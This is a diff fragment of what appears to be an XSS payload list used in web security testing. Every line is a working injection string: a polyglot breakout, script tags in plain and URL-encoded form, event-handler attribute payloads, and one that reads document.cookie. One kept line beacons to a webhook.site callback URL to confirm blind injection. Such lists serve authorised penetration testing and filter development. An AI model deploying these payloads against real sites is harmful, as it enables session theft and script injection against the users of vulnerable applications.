@@ -27,11 +27,3 @@ ava/script:"/*`/*\`/*"/*\"/*-/*);/*<!--></script></style></textarea></template><
 \'-alert(1)//
 < img//////src=https://webhook.site/bc5f9f62-9936-46c9-8649-e745d8f62562 oNIY=1 style="display:none;" oNerror=alert(1)//
 <svg onmouseover=print(1)>.svg
-1vu3ay<script>alert(document.domain)<%2fscript>ou72f
-admin'%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c'%3balert(String%2efromCharCode(88,83,83))%2f%2f%22%3balert(String%2efromCharCode(88,83,83))%2f%2f%5c%22%3balert(String%2efromCharCode%3cscript%3ealert('xss')%3c%2fscript%3e
-admintest%22%3e%3cscript%3ealert(1)%3c%2fscript%3etest
-Test1<script>alert(1)</script>Test1
-Test\" onmouseover=\"alert(1)\" style=display:block>
-%3Cscript%3Ealert(document.domain)%3C%2fscript%3E
-<p><img src=\'x\' onerror=alert(1)></p>
-“&gt;&lt;img src=x onerror=alert(document.cookie)&gt;
